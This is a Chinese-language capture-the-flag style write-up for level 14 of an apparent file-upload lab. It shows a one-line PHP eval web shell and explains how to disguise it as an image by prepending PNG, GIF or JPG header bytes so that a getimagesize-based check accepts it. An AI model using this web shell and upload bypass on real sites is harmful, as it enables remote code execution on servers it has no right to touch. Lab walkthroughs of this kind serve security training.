## 解题wp(By:独立团孙德胜Alan)
本pass可以通过制作图片马绕过

## 1.打开第十四关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)



## 3.分析代码

##### ![](./img/3.png)

##### 本Pass主要利用isImage函数来判断上传的文件是不是图片类型(不仅仅是三种常规类型图片)。来看看isImage函数干了什么事情：

##### 首先利用getimagesize函数检测文件类型。

##### 然后利用image_type_to_extension函数对getimagesize函数返回的数组索引2(Array[2])作后缀名转换，最后用stripos函数检测image_type_to_extension函数返回的结果是否在变量$types白名单中。

##### 所以关键就是getimagesize函数，它的工作原理是什么，什么样的文件会让它返回的数组的索引 2 为"白名单数字"，怎么样去绕过它？

##### 所以getimagesize函数不是绝对安全的，关键看怎么去使用它。对于本Pass只检测getimagesize($file)[2]的值，其绕过方式和Pass-13相似。只是文件头多保留几位罢了。

##### JPG:对于JPG文件保留的文件头标识就多一些了(10行左右)，可以直接在JPG文件都加php木马，但是会有如下错误。

##### PNG:89 50 4e 47 0d 0a 1a 0a(可以抓包修改hex，也可以找个真png，用编辑器打开，将文件头标识后面的内容替换成php木马就行)

##### GIF:GIF89a(直接在文件头加入，也可以抓包修改hex：47 49 46 38 39 61)

## 4.我们可以本地制作一个图片马绕过

![](./img/4.png)

![](./img/5.png)

